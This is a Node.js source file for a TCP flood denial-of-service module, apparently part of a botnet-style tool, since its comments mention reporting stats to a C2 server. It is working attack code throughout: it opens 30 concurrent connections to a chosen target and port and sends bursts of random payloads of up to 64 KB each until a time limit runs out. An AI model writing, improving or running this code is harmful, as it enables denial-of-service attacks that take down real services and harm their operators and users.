import net from 'net';
import { Tools } from '../../utils/tools.js';
import { logger } from '../../utils/logger.js';
import { REQUESTS_SENT, BYTES_SENT } from '../../utils/counter.js';

/**
 * TCP Flood Attack - MAXIMIZED AGGRESSIVE VERSION
 */
export class TCPFlood {
    constructor(target, port, duration, proxies = null) {
        this.target = target;
        this.port = port;
        this.duration = duration;
        this.proxies = proxies;
        this.active = true;
        
        // Stats tracking for C2
        this.stats = {
            totalRequests: 0,
            successfulRequests: 0,
            failedRequests: 0,
            totalBytes: 0,
            totalPackets: 0
        };
    }

    async start() {
        try {
            const endTime = Date.now() + (this.duration * 1000);

            while (Date.now() < endTime && this.active) {
                try {
                    // 30 simultaneous TCP floods
                    const floods = [];
                    for (let i = 0; i < 30; i++) {
                        floods.push(this.attack());
                    }
                    await Promise.allSettled(floods);
                } catch (err) {
                    logger.debug(`TCP flood iteration error: ${err.message}`);
                }
            }
        } catch (err) {
            logger.error(`TCP Flood error: ${err.message}`);
            this.active = false;
        }
    }

    async attack() {
        return new Promise((resolve) => {
            try {
                const socket = new net.Socket();
                
                try {
                    socket.setTimeout(300);
                    socket.setNoDelay(true); // Disable Nagle's algorithm
                    socket.setKeepAlive(false);
                } catch (err) {
                    logger.debug(`Socket config error: ${err.message}`);
                }
                
                let bytesSent = 0;
                const maxBytes = 10485760; // 10MB per connection

                socket.connect(this.port, this.target, () => {
                    const sendBurst = () => {
                        if (!this.active || bytesSent >= maxBytes) {
                            Tools.safeClose(socket);
                            resolve();
                            return;
                        }

                        try {
                            // Send 100 packets per burst
                            for (let i = 0; i < 100; i++) {
                                if (!this.active) break;
                                
                                try {
                                    // Random payload sizes for unpredictability
                                    const payloadSize = Tools.randomInt(1024, 65536);
                                    const payload = Tools.randomBytesBuffer(payloadSize);
                                    const sent = Tools.send(socket, payload);
                                    
                                    if (sent) {
                                        REQUESTS_SENT.add(1);
                                        BYTES_SENT.add(payloadSize);
                                        bytesSent += payloadSize;
                                        this.stats.totalRequests++;
                                        this.stats.successfulRequests++;
                                        this.stats.totalBytes += payloadSize;
                                        this.stats.totalPackets++;
                                    } else {
                                        this.stats.failedRequests++;
                                        Tools.safeClose(socket);
                                        resolve();
                                        return;
                                    }
                                } catch (err) {
                                    this.stats.failedRequests++;
                                }
                            }
                        } catch (err) {
                            logger.debug(`TCP burst error: ${err.message}`);
                        }
                        
                        setImmediate(sendBurst);
                    };

                    sendBurst();
                });

                socket.on('error', (err) => {
                    logger.debug(`TCP socket error: ${err.message}`);
                    Tools.safeClose(socket);
                    resolve();
                });

                socket.on('timeout', () => {
                    Tools.safeClose(socket);
                    resolve();
                });
            } catch (err) {
                logger.debug(`TCP attack error: ${err.message}`);
                resolve();
            }
        });
    }

    stop() {
        this.active = false;
    }
}
